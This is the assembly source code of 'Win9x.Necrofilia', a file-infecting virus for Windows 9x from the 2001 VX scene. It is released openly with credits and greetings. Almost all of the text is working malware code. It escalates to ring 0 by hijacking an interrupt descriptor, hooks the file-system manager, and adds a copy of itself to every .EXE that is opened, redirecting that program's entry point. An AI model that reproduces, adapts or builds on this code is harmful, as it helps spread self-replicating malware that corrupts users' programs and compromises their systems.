;Win9x.Necrofilia (c) necr0mancer october 2001.
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;My first ring0 virus.
;~~~~~~~~~~~~~~~~~~~~~
;   *Infect win PE files.
;   *Jump to ring0
;   *Protected from ring3 access
;   *No payload 
;   *Hooks IFS_File calls(classic)
;   *IO callback
;
;Thanks to:
;~~~~~~~~~~
;   Z0mbie,mort,Hard Wisdom and all VX-scene(last slice:/).

include INC\vxdVX.inc
include INC\win.inc
include INC\pe.inc

includelib INC\import32.lib
extrn	ExitProcess:near
extrn	MessageBoxA:near

	p386
	.model flat
	.data
dd 0
	.code
PORT equ 9999h

_entry_:
        push    0
        call ExitProcess

_start:
        call getDelta

getDelta:
        pop edi
        sub edi,offset getDelta

;        int 3

        mov eax,[edi+imagebase]
        add eax,[edi+OldRVA]
        push eax    			          ;backkkkkkk!!!

        mov dx,PORT
        in al,dx

        cmp al,0EFh
        je _home

;Set own SEH:

        lea eax,[edi+offset error_handle]
        push eax
        push 4 ptr fs:[0]
        mov fs:[0],esp

;Go in ring0 thought int 00h:

        push eax
        sidt [esp-2]
        pop esi				          ;esi=idt address

        add esi,00h*8
        fild qword ptr[esi]

        lea eax,[edi+offset ring0_proc]
        mov word ptr[esi],ax
        shr eax,16
        mov word ptr[esi+6],ax

        xor eax,eax
        div eax                          ;in ring0

        fistp qword ptr [esi]

_exit:
        pop 4 ptr fs:[0]
        pop ecx
_home:  ret


;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;RING 0 prog
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ring0_proc:
        pushad

        xor ebx,ebx
        mov esi,(vir_size*2+10000)/4096+1

        push PAGELOCKED 
        push ebx
        push -1
        push ebx
        push ebx
        push ebx
        push PG_SYS
        push esi
        VMMcall PageAllocate
        add esp,8*4

        push eax
        shr     eax, 12

        push    PC_STATIC
        push    not (PC_WRITEABLE+PC_USER)
        push    esi                         ;npages
        push    eax
        VMMcall PageModifyPermissions
        add     esp, 4*4
        pop eax

        mov 4 ptr[edi+our_delta],eax
        push edi                          ;delta

        lea esi,[edi+offset _start]
        mov edi,eax
        mov ecx,vir_size
        push esi                  ;begin
        push ecx                  ;virsize
        rep movsb

        pop ecx                   ;second copy of virii
        pop esi
        rep movsb

        pop edi
                                  ;install own handle for IFS Manager
        mov esi,eax               ;esi=locked memory
;        push esi
        lea eax,[esi+(offset IFS_hook-offset _start)]
        push eax
        VxDcall IFSMgr,InstallFileSystemAPIhook
        pop edx

        mov 4 ptr[esi+(offset oldFhook-offset _start)],eax 
   				  ;old hook
        mov edx,PORT
;        pop esi                   ;<-
        lea esi,[esi+(offset io_callback-offset _start)]
        VMMcall Install_IO_Handler

        popad
        dec eax
        iret

error_handle:

        mov esp,[esp+8]
        pop 4 ptr fs:[0]
        ret
;-----------------------------------------------------------------------
io_callback:
        mov al,0EFh
        ret
;-----------------------------------------------------------------------

IFS_hook:
        push ebp
        mov ebp,esp
        sub esp,20h

        pushad

        mov edi,11111111h                   ;delta  
our_delta equ $-4
        sub edi,offset _start

        cmp 4 ptr [ebp + 0ch],IFSFN_OPEN
        jne _hook_error

        cmp [edi+_worked],0                 ;system bysy for us;)
        jne _hook_error
        inc 4 ptr [edi+_worked]             ;bysy=on

        call Infect                         ;) 

        dec 4 ptr [edi+_worked]             ;bysy=off
_hook_error:

        popad

	mov eax,[ebp+01ch]
	push eax
	mov eax,[ebp+018h]
	push eax
	mov eax,[ebp+014h]
	push eax
	mov eax,[ebp+010h]
	push eax
	mov eax,[ebp+0ch]
	push eax
	mov eax,[ebp+08h]
	push eax

        mov eax,12345678h
oldFhook equ $-4
        call 4 ptr [eax]

        add esp,18h            ;clear after entering in old proc
        leave
        ret
;-----------------------------------------------------------------------


;=============================================================================
Infect  proc
        pusha

        lea esi,[edi+offset filename]
        mov ebx,esi			;ebx=string begin

        xor al,al
        mov ecx,100h 

        push edi
        mov edi,esi
        rep stosb
        pop edi

        mov al,[ebp+10h]		
        inc al
        jz  no_need_nothin              ;disk present?
        
        add al,'A'-2                    ;add current disk
        mov ah,':'
        mov [esi],ax
        add esi,2

no_need_nothin:

        mov eax,[ebp+1ch]
        add eax,0ch
        mov eax,[eax]
        add eax,4
;dEcode
        push 0
        push 100h
        push eax                         ;source
        push esi                         ;destenation
        VxDcall IFSMgr,UniToBCSPath
        add esp,4*4

;~~~~~~~~~~esi=dest bufer~~~~~~~~~~

        push edi

        mov esi,ebx
_exes:
        lodsb
        test al,al
        jnz _exes

        mov eax,[esi-4]

        cmp eax,00455845h	     ;EXE?
        je ttska

        cmp eax,00657865h	     ;exe?
        jne edi_infect_exit

ttska:
        pop  edi

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        mov esi,ebx                  ;offset of bufer for filename
        call openfile_0

        xchg eax,ebx                 ;ebx=handle

        mov ecx,9000                 ;~9kb
        xor edx,edx
        lea esi,[edi+offset _bufer]
        call readfile_0
;-----------------------------------------------
        xchg edx,esi                 ;edx=mem for header

        movzx eax,word ptr [edx+18h]
        cmp eax,40h                  ;is a PE?
        jne i_close_exit

        mov eax,[edx+3ch]
        add edx,eax                  ;EDX=offset of PE header

        mov eax,[edx]
        cmp eax,00004550h            ;PE00
        jne i_close_exit

        cmp word ptr[edx.pe_RVA],0   ;RVA=0?
        je i_close_exit               

        cmp 4 ptr [edx.pe_timedate],'leeF'
        je i_close_exit

;------------------------------------------------

        movzx eax,word ptr[edx.pe_NThsize]
				      ;NT header size
        add eax,18h                   ;Size of PE-header
        add eax,edx                   ;Eax=offset of Object table

        push eax
        push edx

        movzx eax,word ptr[edx.pe_numObjects]   ;Number of objects 
        dec eax
        mov esi,40                    ;size of table
        mul esi                       ;result in EDX:EAX
        xchg esi,eax                  ;ESI=offset of last object
  
        pop edx
        pop eax

        add esi,eax                   ;correct(esi=last object)

        mov eax,[esi.pe_Obj_vSize]    ;Vsize
        mov ecx,[esi.pe_Obj_pSize]    ;Fsize
        mov [edi+Fsize],ecx

        cmp eax,0
        je i_close_exit

        cmp ecx,0
        je  i_close_exit

        cmp eax,ecx                   ;Vsize<Fsize
        jb i_close_exit

        mov eax,[esi.pe_Obj_pOffset]  ;Foffset
        mov [edi+Foff],eax

        mov eax,[esi.pe_Obj_vOffset]  ;Voffset
        mov [edi+Voff],eax            ;eax,edi,ecx 
                             
        add eax,[edi+Fsize]           ;eax=virtual offset+physic size=new RVA

        mov ecx,[edx.pe_RVA]          ;save old RVA
;?????????????????????????
        mov [edi+offset _Second_copy+(offset OldRVA-offset _start)],ecx  

        mov [edx.pe_RVA],eax          ;set new RVA

;?????????????????????????
        mov ecx,[edx.pe_imagebase]    ;save old imagebase 
        mov [edi+offset _Second_copy+(offset imagebase-offset _start)],ecx

        mov ecx,[edx.pe_vAligment]    ;Virtual aligment
        mov eax,vir_size

        add  [esi.pe_Obj_pSize],eax   ;Add pvirus size

        call Round
        add  [esi.pe_Obj_vSize],eax    ;Add virus size to section

        mov ecx,[edi+Voff]            ;Virtual offset+virtualsize
        add ecx,eax
        mov [edx.pe_imagesize],ecx    ;Correct imageSize

        mov [esi.pe_attributes],0E0000000h
                                      ;attributes
        mov [edx.pe_timedate],'leeF'  ;signature


;-----------------------------------------------
        mov ecx,9000                  ;header
        lea esi,[edi+_bufer]
        xor edx,edx
        call writefile_0
;-----------------------------------------------

        mov ecx,virFsize               ;virsize
        mov edx,[edi+Foff]
        add edx,[edi+Fsize]           ;Offset of end of last section
        lea esi,[edi+offset _Second_copy]                   ;second copy
        call writefile_0

i_close_exit:

        call closefile_0

_infect_exit:
        popa
        ret

edi_infect_exit:
        pop edi
        popa
        ret
Infect  endp


;------------------------------------
;Input:ecx=field of rounding
;      eax=size
 
Round   proc
        pushad

        bsr ecx,eax                                  ;Scan backward for bit

        dec ecx

        shr eax,cl
        inc eax
        shl eax,cl

        mov [esp+7*4],eax                            ;Save for Output

        popad 
        retn
Round   endp


include INC\ioVxd.inc

imagebase     dd 00400000h
OldRVA        dd offset _entry_-00400000h

virFsize  equ ($-offset _start)

Fsize     dd 0
Foff      dd 0
Voff      dd 0
_worked   dd 0
filename  db 100h dup (0)

vir_size  equ ($-offset _start)

_Second_copy:

db vir_size dup (?)


_bufer:       ;(10 kb)


end	_start